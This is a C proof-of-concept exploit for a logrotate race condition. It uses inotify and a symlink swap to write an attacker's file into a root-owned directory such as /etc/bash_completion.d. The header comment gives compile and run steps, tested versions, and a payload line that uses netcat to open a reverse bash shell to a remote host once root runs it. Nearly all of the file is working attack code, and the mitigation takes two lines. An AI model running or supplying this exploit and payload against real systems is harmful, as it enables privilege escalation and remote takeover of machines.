/*
 * logrotate poc exploit
 *
 * [ Brief description ]
 *   - logrotate is prone to a race condition vulnerability when it's exectued with
 *     "create"-option.
 *   - If logrotate is executed as root, with the "create"-option and
 *     the user is in control of the logfile path, it is possible to abuse a
 *     race-condition to write files in ANY directories.
 *   - An attacker could elevate his privileges by writing reverse-shells into 
 *     directories like "/etc/bash_completition.d/".
 *   - This vulnerability was reported by Marc Haber at the debian bug report
 *     ( https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=400198 )
 *   - and an issue was opened at the logrotate github-repository by cgzones
 *     ( https://github.com/logrotate/logrotate/issues/216 )
 *   - This vulnerability was also a challenge at the 35c3 CTF 
 *     ( https://ctftime.org/event/718 )
 *   - A detailed description and a PoC of this challenge was written by the 
 *   - nsogroup ( https://blog.nsogroup.com/logrotate-zajebiste-500-points/ )
 *
 * [ Precondition for privilege escalation ]
 *   - Logrotate needs to be executed as root
 *   - The logpath needs to be in control of the attacker
 *   - "create" option is set in the logrotate configuration
 * 
 * [ Tested version ]
 *   - Debian GNU/Linux 9.5 (stretch)
 *   - Amazon Linux 2 AMI (HVM)
 *   - Ubuntu 18.04.1
 *   - logrotate 3.8.6
 *   - logrotate 3.11.0
 *   - logrotate 3.15.0
 *
 * [ Compile ]
 *   - gcc -o logrotten logrotten.c
 *
 * [ Prepare payload ]
 *   - echo "if [ `id -u` -eq 0 ]; /bin/nc -e /bin/bash myhost 3333 &; fi" > payloadfile
 *
 * [ Run exploit ]
 *   - nice -n -20 ./logrotten /tmp/log/pwnme.log payloadfile
 *
 * [ Known Problems ]
 *   - It's hard to win the race inside a docker container
 *
 * [ Mitigation ]
 *   - make sure that logpath is owned by root
 *   - or use option "nocreate"
 *
 * [ Author ]
 *   - Wolfgang Hotwagner
 *
 * [ Contact ]
 *   - https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <string.h>
#include <alloca.h>
#include <sys/stat.h>


#define EVENT_SIZE  ( sizeof (struct inotify_event) )
#define EVENT_BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )

/* use TARGETDIR without "/" at the end */
#define TARGETDIR "/etc/bash_completion.d"

#define DEBUG 1

int main(int argc, char* argv[] )
{
  int length, i = 0;
  int j = 0;
  int index = 0;
  int fd;
  int wd;
  char buffer[EVENT_BUF_LEN];
  const char *payloadfile;
  const char *logfile;
  char *logpath;
  char *logpath2;
  char *targetpath;
  char *targetdir;
  char ch;
  const char *p;
  FILE *source, *target;    

  if(argc < 3)
  {
	  fprintf(stderr,"usage: %s <logfile> <payloadfile> [targetdir]\n",argv[0]);
	  exit(1);
  }
  
  logfile = argv[1];
  payloadfile = argv[2];

  for(j=strlen(logfile); logfile[j] != '/' && j != 0; j--);

  index = strlen(logfile)-j-1;

  p = &logfile[index];

  logpath = alloca(strlen(logfile)*sizeof(char));
  logpath2 = alloca((strlen(logfile)+2)*sizeof(char));

  if(argc > 3)
  {
	targetdir = argv[3];
  	targetpath = alloca( ( (strlen(argv[3])) + (strlen(p)) +3) *sizeof(char));
  	strcat(targetpath,argv[3]);
  }
  else
  {
	targetdir= TARGETDIR;
  	targetpath = alloca( ( (strlen(TARGETDIR)) + (strlen(p)) +3) *sizeof(char));
  	strcat(targetpath,TARGETDIR);
  }
  strcat(targetpath,"/");
  strcat(targetpath,p);

  for(j = 0; j < index; j++)
	  logpath[j] = logfile[j];
  logpath[j-1] = '\0';

  strcpy(logpath2,logpath);
  logpath2[strlen(logpath)] = '2';
  logpath2[strlen(logpath)+1] = '\0';

  /*creating the INOTIFY instance*/
  fd = inotify_init();

  if( DEBUG == 1)
  {
  	printf("logfile: %s\n",logfile);
  	printf("logpath: %s\n",logpath);
  	printf("logpath2: %s\n",logpath2);
  	printf("targetpath: %s\n",targetpath);
  	printf("targetdir: %s\n",targetdir);
  	printf("p: %s\n",p);
  }

  /*checking for error*/
  if ( fd < 0 ) {
    perror( "inotify_init" );
  }

  wd = inotify_add_watch( fd,logpath, IN_MOVED_FROM );


while(1)
{
  i=0;
  length = read( fd, buffer, EVENT_BUF_LEN ); 

  while (i < length) {     
      struct inotify_event *event = ( struct inotify_event * ) &buffer[ i ];     if ( event->len ) {
      if ( event->mask & IN_MOVED_FROM ) {
	  if(strcmp(event->name,p) == 0)
	  {
            /* printf( "Something is moved %s.\n", event->name ); */
            rename(logpath,logpath2);
            symlink(targetdir,logpath);
	    sleep(1);
	    source = fopen(payloadfile, "r");	    
	    if(source == NULL)
		    exit(EXIT_FAILURE);

	    target = fopen(targetpath, "w");	    
	    if(target == NULL)
	    {
		    fclose(source);
		    exit(EXIT_FAILURE);
	    }

	    while ((ch = fgetc(source)) != EOF)
		    fputc(ch, target);

	    chmod(targetpath,S_IRUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
	    fclose(source);
	    fclose(target);
   	    inotify_rm_watch( fd, wd );
   	    close( fd );

	    exit(EXIT_SUCCESS);
	  }
      }
    }
    i += EVENT_SIZE + event->len;
  }
}
  /*removing from the watch list.*/
   inotify_rm_watch( fd, wd );

  /*closing the INOTIFY instance*/
   close( fd );

   exit(EXIT_SUCCESS);
}
